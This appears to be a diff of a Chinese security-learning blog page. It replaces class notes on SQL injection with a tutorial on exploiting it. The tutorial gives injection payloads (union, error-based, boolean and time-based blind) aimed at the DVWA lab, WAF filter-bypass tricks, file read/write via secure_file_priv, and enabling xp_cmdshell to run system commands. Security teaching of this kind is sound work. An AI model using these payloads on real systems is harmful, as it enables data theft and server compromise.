 <h4 id="时间型盲注的结果判断"><a href="#时间型盲注的结果判断" class="headerlink" title="时间型盲注的结果判断"></a>时间型盲注的结果判断</h4><p>时间型盲注的结果判断主要是根据服务器的响应结果，如果在<strong>加入时间型盲注语句后服务器响应有明显的延时，可以判断SQL注入漏洞存在。</strong>为了排除网络环境影响，可以尝试不同延时量的时间型盲注语句，根据延时的差异进一步进行确认。使用Firefox的firebug插件可以准确的跟踪延时信息。</p>
-<h2 id="课堂笔记"><a href="#课堂笔记" class="headerlink" title="课堂笔记"></a>课堂笔记</h2><h3 id="扩展：正则表达式"><a href="#扩展：正则表达式" class="headerlink" title="扩展：正则表达式"></a>扩展：正则表达式</h3><p>正则表达式(regexp)的主要作用：分割、匹配、查找、替换</p>
-<p>WAF—Web Application Firewall(Web应用防火墙)</p>
-<p>*匹配前一个字符出现0次或者无限次</p>
-<p>?匹配前一个字符出现1次或者0次，即要么有1次，要么没有</p>
-<p>.*任意一个字符可以出现0次或无限次（贪婪匹配，尽可能多地匹配）</p>
-<p>.*?仍然表示任意一个字符可以出现0次或无限次（非贪婪匹配，尽可能少地区匹配）</p>
-<pre><code>正则表达式：.*test.* 在任意字符中匹配test
-test1
-test2
-test3
-3test4</code></pre>
-<pre><code>.*t     匹配结果：123456test #匹配到的是最后一个t，前面的所有内容包括tes都被当做任意字符去匹配，可出现0次或无限次
-.*?t    匹配结果：123456t   #匹配到的是第一个t，前面的123456被当做任意字符
-123456test</code></pre>
-<p>preg_match((.*?),$_GET[‘user’],$return);  //在字符串中查找匹配项，返回一个数组</p>
-<p>preg_replace((.*?),’\\n’,$_GET[‘user’]);    //将查找到的字符串替换成\\n</p>
-<h3 id="SQL注入"><a href="#SQL注入" class="headerlink" title="SQL注入"></a>SQL注入</h3><p>报错注入的测试语句 ‘ “ ) —联合查询、报错</p>
-<p>布尔型 and 1=1 and 1=2 —–布尔型盲注</p>
-<p>时间型 and sleep(5) —-时间型盲注</p>
-<p>步骤：</p>
-<p>1.选择该注入点的注入方式</p>
-<p>2.判断数据库类型</p>
-<p>3.选择漏洞利用的目标，优先选择读写文件</p>
-<p>4.构造SQL语句进行攻击</p>
-<h3 id="SQL注入步骤"><a href="#SQL注入步骤" class="headerlink" title="SQL注入步骤"></a>SQL注入步骤</h3><h4 id="1-对某个网站进行注入，分为四个步骤"><a href="#1-对某个网站进行注入，分为四个步骤" class="headerlink" title="1.对某个网站进行注入，分为四个步骤"></a>1.对某个网站进行注入，分为四个步骤</h4><ul>
-<li>判断闭合类型、使用的语句方法</li>
-<li>判断数据库 —SQL语句判断（表的特征）或者根据网站环境猜测，也可以根据返回的报错信息判断。</li>
-</ul>
-<pre><code>不同数据库的特征：
-mysql information_schema
-sqlserver sysobjects
-oracle dual</code></pre>
+<h2 id="SQL注入漏洞的利用"><a href="#SQL注入漏洞的利用" class="headerlink" title="SQL注入漏洞的利用"></a>SQL注入漏洞的利用</h2><h3 id="SQL注入的核心利用目标"><a href="#SQL注入的核心利用目标" class="headerlink" title="SQL注入的核心利用目标"></a>SQL注入的核心利用目标</h3><p>（1）SQL注入的核心利用目标主要包括以下三类：</p>
 <ul>
-<li>选择利用的操作 – 操作数据/执行命令/读写文件（通过在网站下写一句话木马来控制服务器，但前提是知道网站根目录的绝对路径）</li>
-<li>构造SQL注入语句 – 向数据库发起查询以获取有用的信息。</li>
+<li>操作数据</li>
 </ul>
-<h4 id="2-MySQL手工注入的方式"><a href="#2-MySQL手工注入的方式" class="headerlink" title="2.MySQL手工注入的方式"></a>2.MySQL手工注入的方式</h4><ul>
-<li>联合查询 使用union操作符将两个select语句拼接起来同时在数据库中进行查询，将查询结果显示在页面上。</li>
-<li>报错注入 通过网站的报错信息，某些特殊函数会将函数内的SQL语句进行执行，若该函数出现报错，则会将查询结果返回在页面上。</li>
-<li>布尔型盲注 通过网站不同的回显信息，判断查询语句的正确与否，可以在and后构造SQL语句向数据库发起查询，若后续的SQL语句正确，则返回正常结果，以此获取信息 例如：id=1 and 1=1 返回正常；id=1 and 1=2 返回异常；</li>
-<li>时间型盲注 通过页面的返回时间来判断SQL语句是否正确。若正确，例如在SQL查询语句后加上sleep(5)来判断。</li>
+<pre><code>•查询数据是SQL注入最常见的一种利用方式，网站数据库中通常存储着大量有价值的数据，通过批量查询数据
+的方式可以获取这些数据，也就是人们常说的“拖库”。
+•数据库中通常还存储着WEB应用的管理后台账号密码，通过获取管理后台账号密码可以更加方便的提取数据、
+进行更多操作或为进一步攻击提供便利，因此网站管理后台账号密码往往是数据查询的第一目标
+•除了查询以外，也可以对数据进行增删改操作，达到更多的非法目的</code></pre>
+<ul>
+<li>读写文件</li>
 </ul>
-<h4 id="3-MySQL中如何进行对应的注入"><a href="#3-MySQL中如何进行对应的注入" class="headerlink" title="3.MySQL中如何进行对应的注入"></a>3.MySQL中如何进行对应的注入</h4><ul>
-<li>内置数据库：information_schema</li>
+<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句读写文件来进行进一步攻击以获取更多的权限，如读取
+网站配置文件、修改注册表文件、上传木马等。</code></pre>
+<ul>
+<li>执行命令</li>
 </ul>
-<pre><code>内置表schemata，存放数据库名
-内置表tables，存放表名和数据库名的对应关系
-内置表columns，存放了字段名和表名、数据库名的对应关系</code></pre>
+<pre><code>如果数据库的配置权限不当，攻击者可以通过SQL语句执行操作系统命令来进行进一步攻击获取更多的权限，
+如开放远程连接服务、创建系统用户、配合文件读写功能完成反弹shell等。</code></pre>
+<h3 id="SQL注入利用的基本流程"><a href="#SQL注入利用的基本流程" class="headerlink" title="SQL注入利用的基本流程"></a>SQL注入利用的基本流程</h3><p>（1）注入点分析</p>
+<ul>
+<li>注入点位置</li>
+<li>数字型/字符型</li>
+<li>可利用的注入方式（联合查询、报错注入、盲注等）</li>
+</ul>
+<p>（2）判断数据库类型</p>
+<ul>
+<li>MySQL</li>
+<li>SQLserver</li>
+<li>Oracle</li>
+<li>PostgreSQL</li>
+</ul>
+<p>（3）选择漏洞利用目标</p>
+<ul>
+<li>操作数据</li>
+<li>读写文件</li>
+<li>执行命令</li>
+</ul>
+<p>（4）构造漏洞利用语句</p>
+<ul>
+<li>基础利用语句</li>
+<li>绕过过滤</li>
+</ul>
+<h3 id="数据库类型判断"><a href="#数据库类型判断" class="headerlink" title="数据库类型判断"></a>数据库类型判断</h3><p>（1）基于WEB开发语言（推测）</p>
+<ul>
+<li>Asp、aspx通常与access、sqlserver一起使用</li>
+<li>Php通常与mysql、PostgreSQL一起使用</li>
+<li>Jsp通常与oracle和mysql一起使用</li>
+</ul>
+<p>（2）基于报错信息：数据库报错信息通常会暴露数据库类型，可以帮助我们有效判断数据库类型</p>
+<p>（3）基于数据库特性：某些函数、内置表或语法为某些数据库特有，利用这些特性构造相关语句可以<br>帮助我们判断出数据库类型。</p>
+<h4 id="基于报错信息判断"><a href="#基于报错信息判断" class="headerlink" title="基于报错信息判断"></a>基于报错信息判断</h4><p>（1）MySQL：MySQL server字样</p>
+<p><img src="https://i.loli.net/2021/04/24/ocZSYJDwniUq43T.png" alt="image-20210424092955963"></p>
+<p>（2）Oracle：ORA-XXXX字样</p>
+<p><img src="https://i.loli.net/2021/04/24/XtGoqIR2vQkrgmw.png" alt="image-20210424093056008"></p>
+<p>（3）SQLite</p>
+<p><img src="https://i.loli.net/2021/04/24/mOEqc8KFakntS1u.png" alt="image-20210424093122849"></p>
+<h4 id="基于数据库特性判断"><a href="#基于数据库特性判断" class="headerlink" title="基于数据库特性判断"></a>基于数据库特性判断</h4><p>（1）ACCESS</p>
+<pre><code>and (select count (*) from sysobjects)&gt;0返回异常
+and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
+<p>（2）SQLSERVER</p>
+<pre><code>and (select count (*) from sysobjects)&gt;0 返回正常
+and (select count (*) from msysobjects)&gt;0返回异常</code></pre>
+<p>（3）MySQL</p>
+<pre><code>id=2 and version()&gt;0 返回正常
+id=2 and length(user())&gt;0返回正常
+id=2 CHAR(97, 110, 100, 32, 49, 61, 49)返回正常</code></pre>
+<p>（4）Oracle</p>
+<pre><code>and length (select user from dual)&gt;0 返回正常</code></pre>
+<h2 id="SQL注入利用-操作数据-数据查询"><a href="#SQL注入利用-操作数据-数据查询" class="headerlink" title="SQL注入利用-操作数据-数据查询"></a>SQL注入利用-操作数据-数据查询</h2><p>操作数据是SQL注入漏洞最常见的利用方式，其中利用SQL注入查询敏感数据又是操作数据最常见的利用方法，具体流程如下：</p>
+<p>（1）掌握基础知识</p>
+<ul>
+<li>关键表</li>
+<li>关键内置函数</li>
+<li>其他特性</li>
+<li>编码技巧</li>
+</ul>
+<p>（2）选择提取方式</p>
 <ul>
 <li>联合查询</li>
+<li>报错注入</li>
+<li>布尔盲注</li>
+<li>时间盲注</li>
 </ul>
-<pre><code>order by 以查询结果中的某一列进行排序。若该列不存在，则会产生报错。
-union select 使用union操作符将前后两个select语句放在数据库中同时查询（union操作符前后的select语句列数、字符类型需要相等）由于MySQL是弱类型数据库，故不需要字符类型相同。</code></pre>
-<h4 id="4-联合查询的流程"><a href="#4-联合查询的流程" class="headerlink" title="4.联合查询的流程"></a>4.联合查询的流程</h4><ul>
-<li>判断可以注入的方式以及该注入点的闭合形式</li>
-<li>判断前一个SQL语句查询的列数（order by）</li>
-</ul>
-<pre><code>例如对dvwa的注入过程：
-单引号字符型
-联合查询 报错注入 盲注
-判断前一个查询语句查询了两列
-判断数据的回显位置（把前面的SQL参数置空，在后面使用union select 1,2来判断回显位置）
-说明union select查询的两个字段都会显示在页面上，则可以在1和2的位置构造SQL语句向数据库发起查询。
-将查询结果放在一行显示用group_concat()函数。
-编码问题convert--用来解决查询时的编码问题。该函数可以修改当前数据库的查询编码convert(colname using latin1)
-获取数据库名、表名和列名后查询数据,查询user和password字段的值：
--1&#39; union select user,password form dvwa.users;</code></pre>
+<p>（3）构造原始语句</p>
 <ul>
-<li>union select查询数据库、表、字段、数据的信息</li>
+<li>获取数据库名</li>
+<li>获取关键表</li>
+<li>获取关键字段</li>
+<li>获取目标数据</li>
 </ul>
-<h5 id="扩展"><a href="#扩展" class="headerlink" title="扩展"></a>扩展</h5><p>EXP:exploit 攻击脚本–如何利用该漏洞执行特定的效果(操作数据、控制系统)–有害的</p>
-<pre><code>-1&#39; union select database(),group_concat(convert(schema_name using latin1)) from information_schema.schemata#;获取当前数据库名和网站数据库中的所有数据库名</code></pre>
-<p>PoC：Proof of Concept观点证明–证明该漏洞存在 —无害的</p>
-<pre><code>1&#39; union select 1,2#      可以发现存在的漏洞</code></pre>
-<h4 id="5-报错注入、盲注的流程"><a href="#5-报错注入、盲注的流程" class="headerlink" title="5.报错注入、盲注的流程"></a>5.报错注入、盲注的流程</h4><ul>
-<li>判断注入方式及闭合形式（不需要判断前一个SQL语句查询的列数。）</li>
-<li>使用特定语法进行注入，查询数据库、表、字段、数据的信息</li>
-</ul>
-<pre><code>报错注入函数
-extractvalue(value,path)--如果在path位置构造一个SQL语句，这个语句会先将被数据库进行执行。若path位置存在错误，则extractvalue函数会产生报错，将报错信息显示在页面上。该函数存在吃字符现象，无法完全显示报错的返回结果。
-报错注入的重点：在path的位置构造一个子句</code></pre>
+<p>（4）绕过防护策略</p>
 <ul>
-<li>limit(m,n)从第m行开始，查询后n行的数据。</li>
+<li>大小写</li>
+<li>回车换行</li>
+<li>截断</li>
+<li>特殊字符</li>
+<li>特殊函数</li>
 </ul>
-<pre><code>limit(0,1) //从第0行开始，向后查询1行。也就是只查询第1行
-limit(5,3) //从第5行开始，向后查询3行。也就是查询6,7,8行。</code></pre>
-<h4 id="6-盲注"><a href="#6-盲注" class="headerlink" title="6.盲注"></a>6.盲注</h4><p>（1）核心思想：根据页面是否正常返回结果来判断后面构造的SQL语句是否正确。</p>
-<pre><code>select * from users where user_id=&quot;1&quot; and (select database())=&quot;dvwa&quot;;</code></pre>
-<p>（2）截断函数left()</p>
-<pre><code>select * from users where user_id=&quot;1&quot; and (select left(database(),1))=char(97);</code></pre>
-<p>（3）substr(string,m,n) ，该函数可返回字符串的一部分。例如，substr(string,1,1)返回从第1个到第3个字符。substr(string,2,1)表示从第2个字符开始，返回1个字符；也就是返回第2个字符</p>
-<pre><code>爆破思想：只改变m和等号后面的字符
-id=1 and (select substr(database(),1,1))=&quot;a&quot;
-id=1 and substr(database(),2,1)=&quot;d&quot;
-id=1 and substr(database(),3,1)=&quot;m&quot;
-id=1 and substr(database(),4,1)=&quot;i&quot;
-id=1 and substr(database(),5,1)=&quot;n&quot;</code></pre>
-<p>（4）regexp+‘正则表达式’</p>
-<pre><code>id=1 and (select database() regexp=&#39;^a&#39;) //^表示匹配前面字符串的第一个字符。
-id=1 and (select database() regexp=&#39;^ad&#39;) //^表示匹配前面字符串的前两个字符。</code></pre>
-<p>（5）length()</p>
-<pre><code>1&#39; and (select length(database())&lt;10)</code></pre>
-<p>（6）步骤：</p>
+<h3 id="数据提取方式"><a href="#数据提取方式" class="headerlink" title="数据提取方式"></a>数据提取方式</h3><p>（1）联合查询</p>
 <ul>
-<li>获取当前需要查询的内容的长度</li>
-<li>根据对应的长度进行每一位字符的爆破</li>
+<li>构造联合查询语句，将目标数据直接查询出来并显示在页面上</li>
+<li>目标数据直接在页面显示内容中提取</li>
 </ul>
-<p>（7）常用工具：Burp Suite。爆破时可能会存在符号编码问题(例如引号、空格无法识别），可在网页中提交时用burp抓包后发送到Intruder再标记要爆破的内容。</p>
-<pre><code>1&#39; and (select substr(database(),1,1)=char(97))#
-1&#39; and (select substr(database(),2,1)=char(97))#
-1&#39; and (select substr(database(),3,1)=char(97))#
-1&#39; and (select substr(database(),4,1)=char(97))#
-1&#39; and (select substr(database(),1,1)=char(98))#
-1&#39; and (select substr(database(),2,1)=char(98))#
-......</code></pre>
-<p>逗号的ASCII码为44，可用此来区分返回结果中的不同数据库名称、表名、字段名、数据。</p>
-<p>字母a-z：97-122，MySQL对大小写不敏感</p>
-<p>数字0-1:448-57</p>
-<p>下划线：95</p>
-<p><strong>时间型盲注</strong>：</p>
-<p>if()函数。</p>
-<pre><code>#1=1是条件，success为条件成立时的操作，failed为条件不成立的操作
-select if(1=1,&quot;success&quot;,&quot;failed&quot;) 
-select if(&quot;sql语句&quot;=&quot;值&quot;,sleep(3),0)
-
-?id=1&#39; and if(left(database(),1)=&#39;a&#39;,sleep(3),0)</code></pre>
-<p>**注：</p>
+<p>（2）报错注入</p>
 <ul>
-<li>单引号、双引号被过滤，用char()、十六进制。</li>
-<li>substr()被过滤，用left()、mid()、regexp()、like()</li>
-<li>extractvalue()被过滤，用updataxml()、floor()、exp()</li>
-<li>在单引号、双引号前加了转义符，则用宽字节注入 引号前加%df</li>
-<li>过滤了union、select、where等字符串</li>
+<li>构造错误的SQL语句，并将目标数据在报错信息中直接显示</li>
+<li>必须在网站回显原始报错数据的情况下使用</li>
+<li>目标数据在报错信息中提取</li>
 </ul>
-<pre><code>将关键字替换成了空字符，
-1.这时可用双写绕过，ununionion
-2.大小写绕过，UnioN</code></pre>
+<p>（3）布尔型盲注</p>
 <ul>
-<li>过滤空格</li>
+<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面回显内容不同</li>
+<li>根据页面显示结果推断目标数据内容</li>
 </ul>
-<pre><code>将空格替换成了空字符
-1./**/
-2.0x09
-3.&#123;$IFS&#125; （在Linux中，代表一个空格）</code></pre>
+<p>（4）时间盲注</p>
 <ul>
-<li>宽字节注入、堆叠注入</li>
+<li>构造特殊的SQL语句对目标数据进行猜测，使得猜测正确时与猜测错误时页面响应时间不同</li>
+<li>根据页面响应时间推断目标数据内容</li>
 </ul>
-<p>单引号字符型，可以进行联合查询和报错注入</p>
-<p>1.数据库名 select database();</p>
-<p>2表名</p>
-<p>3.字段名</p>
-<p>mysql 内置数据库：imformation_schema,该数据库默认的三张表schemata、tables、columns</p>
-<p>数据表：</p>
-<p>1.schemata  schema_name属性存放所有数据库名</p>
-<p>2.tables     table_name 存放表名</p>
-<p>3.columns column_name 存放列名</p>
-<pre><code>#在imformation_schema数据库中的schemata表中查询数据库名称为dvwa的数据库
-select schema_name from information_schema.schemata where schema_name=&quot;dvwa&quot;; 
-
-#在information_schema数据库中的tables表中查询数据库名称为dvwa的所有的表的名称
-select table_name from information_schema.TABLES where table_schema=&quot;dvwa&quot;; 
-
-#在information_schema数据库中的columns表中查询数据库名称为dvwa的users表的的所有字段
-select column_name from information_schema.columns where table_schema=&quot;dvwa&quot; and table_name=&quot;users&quot;; </code></pre>
-<p>union特性：前后的select语句的列数必须一致 —-需要知道网站构造的SQL语句查询了几个字段</p>
-<pre><code>1&#39; union select 1,2#         字符型
-1 union select 1,2           数字型</code></pre>
-<p> 查询时一般让union前的SQL语句执行结果置空，转而执行union后面的select查询语句。</p>
-<pre><code>-1&#39; union select 1,2#
-#convert(xxx using latin1) 进行编码转化,避免查询的前后两个字段编码不同。
-select 1,convert(table_name using latin1) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;
-
-#group_concat()函数，将查询的结果放在一行显示
-select 1,group_concat(convert(table_name using latin1)) from information_schema.TABLES where table_schema=&quot;dvwa&quot;;</code></pre>
-<p>order by  x 以x列进行排序</p>
-<p>若order by 3显示正常，order by 4显示异常，则代表有3列</p>
-<p>用order by判断列数时可借助二分法的思想快速判断。</p>
-<pre><code>1&#39; order by 4 --+            字符型
-1 order by 4                 数字型</code></pre>
-<h3 id="扩展：Windows下的命令"><a href="#扩展：Windows下的命令" class="headerlink" title="扩展：Windows下的命令"></a>扩展：Windows下的命令</h3><pre><code>netstat -ano | findstr &quot;8080&quot;   //查询8080端口是否被占用
-tasklist /svc | findstr 9940   //查询9940这个进程</code></pre>
+<h3 id="数据查询语句构造"><a href="#数据查询语句构造" class="headerlink" title="数据查询语句构造"></a>数据查询语句构造</h3><h4 id="构造原始语句"><a href="#构造原始语句" class="headerlink" title="构造原始语句"></a>构造原始语句</h4><p>查询当前数据库–&gt;查询关键表–&gt;查询关键字段–&gt;提取目标数据</p>
+<h4 id="联合查询"><a href="#联合查询" class="headerlink" title="联合查询"></a>联合查询</h4><p>UNION 操作符用于合并两个或多个 SELECT 语句的结果集。UNION 内部的 SELECT 语句必须拥有<strong>相同<br>数量的列。</strong>列也必须拥有<strong>相似的数据类型（MySQL为弱类型数据库，可不需要相似数据类型）。</strong>当UNION之前的select语句结果集为空时，查询结果将由UNION后的SELECT语句控制。</p>
+<p><img src="https://i.loli.net/2021/04/25/quXcnafewH7YOUo.png" alt="image-20210425194312073"></p>
+<h4 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h4><p><img src="https://i.loli.net/2021/04/25/w1aF8Kxtq5CLrdG.png" alt="image-20210425194416463"></p>
+<h4 id="布尔型盲注"><a href="#布尔型盲注" class="headerlink" title="布尔型盲注"></a>布尔型盲注</h4><p><img src="https://i.loli.net/2021/04/25/9XQNd6ziu2qKYsc.png" alt="image-20210425194549389"></p>
+<h4 id="时间型盲注"><a href="#时间型盲注" class="headerlink" title="时间型盲注"></a>时间型盲注</h4><p>（1）时间型盲注与布尔型盲注的语句构造过程类似，通常在布尔型盲注表达式的基础上<strong>使用IF语句加入延时语句来构造，</strong>由于时间型盲注耗时较大，通常利用脚本工具来执行，在手工利用的过程中较少使用。</p>
+<p><img src="https://i.loli.net/2021/04/25/kXfIo6OZPv9malA.png" alt="image-20210425194748742"></p>
+<p>（2）说明：</p>
+<ul>
+<li>通常使用sleep()等专用的延时函数来进行时间盲注，特殊情况下也可以使用某些耗时较高的操作代替这些函数。</li>
+<li>为了提高效率，通常在表达式判断为真时执行延时语句。</li>
+<li>时间盲注语句拼接时无特殊要求，保证语法正确即可。</li>
+</ul>
+<h2 id="SQL注入利用-读写文件"><a href="#SQL注入利用-读写文件" class="headerlink" title="SQL注入利用-读写文件"></a>SQL注入利用-读写文件</h2><p>（1）读写权限判断</p>
+<ul>
+<li>关键函数</li>
+<li>关键值</li>
+</ul>
+<p>（2）绝对路径获取：基于报错信息</p>
+<p>（3）文件读取/写入</p>
+<ul>
+<li>文件读取函数</li>
+<li>文件写入函数</li>
+</ul>
+<h3 id="读写文件基础知识"><a href="#读写文件基础知识" class="headerlink" title="读写文件基础知识"></a>读写文件基础知识</h3><p>（1）Windows下：修改my.ini在[mysqld]内加入secure_file_priv=</p>
+<p>Linux下：修改my.cnf在[mysqld]内加入secure_file_priv=</p>
+<p>（2）然后重启mysql，再查询secure_file_priv</p>
+<pre><code>show variables like &#39;%secure%&#39;;
+//值为null，表示限制mysqld不允许导入/导出
+//值为/tmp/，表示限制mysqld的导入/导出只能发生在/tmp/目录下
+//值没有具体值时，表示不对mysqld的导入/导出做限制。</code></pre>
+<h2 id="SQL注入利用-执行命令"><a href="#SQL注入利用-执行命令" class="headerlink" title="SQL注入利用-执行命令"></a>SQL注入利用-执行命令</h2><p>（1）当数据库是SQL SERVER的时候可以利用xp_cmdshell存储过程执行系统命令。需要执行以下语句开启xp_cmdshell存储过程。</p>
+<pre><code>EXEC sp_configure &#39;show advanced options&#39;, 1;RECONFIGURE;EXEC sp_configure &#39;xp_cmdshell&#39;, 
+1;RECONFIGURE;</code></pre>
+<p><img src="https://i.loli.net/2021/04/25/AdeurYM6LOmqEZv.png" alt="image-20210425200005888"></p>
+<p>（2）开启之后使用xp_cmdshell可以执行系统命令，如下图所示使用该存储过程可以添加一个管理员组的用户</p>
 
       
 
@@ -2767,189 +3289,9 @@ hexo s //启动服务</code></pre>
 
 
   
-    <article id="post-Python/Linux下进行Python3的pip换源操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/05/Python/Linux%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/">Linux下进行Python3的pip换源操作</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/05/Python/Linux%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/" class="archive-article-date">
-  	<time datetime="2021-04-05T04:24:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1）sudo apt install python3-pip</p>
-<p>（2）python3 -V #查看Python3的版本</p>
-<p>（3）pip3 -V #查看pip3的版本</p>
-<p>（4）sudo python3 -m pip install –upgrade pip #升级pip版本，pip3版本大于10可忽略此步骤</p>
-<ul>
-<li>若该命令执行失败，可以在resolv配置文件中增加nameserevr后再次执行。</li>
-</ul>
-<pre><code>sudo vim /etc/resolv.conf
-nameserver 8.8.8.8</code></pre>
-<p>（5）pip3 config set global.index-url 源链接 #若pip3版本大于10，则可使用这条命令进行换源，无需进行其它新建文件操作</p>
-<p>（6）pip3 install 库名称 #换源成功后下载第三方库</p>
-<p>（7）国内源地址</p>
-<pre><code>清华大学 https：//pypi.tuna.tsinghua.edu.cn/simple/ 
-阿里云 http：//mirrors.aliyun.com/pypi/simple/ 
-中国科技大学 https：//pypi.mirrors.ustc.edu.cn/simple/ 
-豆瓣(douban) http：//pypi.douban.com/simple/ 
-中国科学技术大学 http：//pypi.mirrors.ustc.edu.cn/simple/</code></pre>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">Python</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/05/Python/Linux%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
-    <article id="post-deepin/deepin下进行Python3的pip换源操作" class="article article-type-post  article-index" itemscope itemprop="blogPost">
-  <div class="article-inner">
-    
-      <header class="article-header">
-        
-  
-    <h1 itemprop="name">
-      <a class="article-title" href="/2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/">deepin下进行Python3的pip换源操作</a>
-    </h1>
-  
-
-        
-        <a href="/2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/" class="archive-article-date">
-  	<time datetime="2021-04-05T04:24:25.000Z" itemprop="datePublished"><i class="icon-calendar icon"></i>2021-04-05</time>
-</a>
-        
-      </header>
-    
-    <div class="article-entry" itemprop="articleBody">
-      
-        <p>1）sudo apt install python3-pip</p>
-<p>（2）python3 -V #查看Python3的版本</p>
-<p>（3）pip3 -V #查看pip3的版本</p>
-<p>（4）sudo python3 -m pip install –upgrade pip #升级pip版本，pip3版本大于10可忽略此步骤</p>
-<ul>
-<li>若该命令执行失败，可以在resolv配置文件中增加nameserevr后再次执行。</li>
-</ul>
-<pre><code>sudo vim /etc/resolv.conf
-nameserver 8.8.8.8</code></pre>
-<p>（5）pip3 config set global.index-url 源链接 #若pip3版本大于10，则可使用这条命令进行换源，无需进行其它新建文件操作</p>
-<p>（6）pip3 install 库名称 #换源成功后下载第三方库</p>
-<p>（7）国内源地址</p>
-<pre><code>清华大学 https：//pypi.tuna.tsinghua.edu.cn/simple/ 
-阿里云 http：//mirrors.aliyun.com/pypi/simple/ 
-中国科技大学 https：//pypi.mirrors.ustc.edu.cn/simple/ 
-豆瓣(douban) http：//pypi.douban.com/simple/ 
-中国科学技术大学 http：//pypi.mirrors.ustc.edu.cn/simple/</code></pre>
-
-      
-
-      
-    </div>
-    <div class="article-info article-info-index">
-      
-      
-	<div class="article-tag tagcloud">
-		<i class="icon-price-tags icon"></i>
-		<ul class="article-tag-list">
-			 
-        		<li class="article-tag-list-item">
-        			<a href="javascript:void(0)" class="js-tag article-tag-list-link color2">deepin</a>
-        		</li>
-      		
-		</ul>
-	</div>
-
-      
-
-      
-        <p class="article-more-link">
-          <a class="article-more-a" href="/2021/04/05/deepin/deepin%E4%B8%8B%E8%BF%9B%E8%A1%8CPython3%E7%9A%84pip%E6%8D%A2%E6%BA%90%E6%93%8D%E4%BD%9C/">展开全文 >></a>
-        </p>
-      
-
-      
-      <div class="clearfix"></div>
-    </div>
-  </div>
-</article>
-
-<aside class="wrap-side-operation">
-    <div class="mod-side-operation">
-        
-        <div class="jump-container" id="js-jump-container" style="display:none;">
-            <a href="javascript:void(0)" class="mod-side-operation__jump-to-top">
-                <i class="icon-font icon-back"></i>
-            </a>
-            <div id="js-jump-plan-container" class="jump-plan-container" style="top: -11px;">
-                <i class="icon-font icon-plane jump-plane"></i>
-            </div>
-        </div>
-        
-        
-    </div>
-</aside>
-
-
-
-
-  
   
     <nav id="page-nav">
-      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/6/">6</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
+      <span class="page-number current">1</span><a class="page-number" href="/page/2/">2</a><a class="page-number" href="/page/3/">3</a><span class="space">&hellip;</span><a class="page-number" href="/page/7/">7</a><a class="extend next" rel="next" href="/page/2/">Next &amp;raquo;</a>
     </nav>
   
 
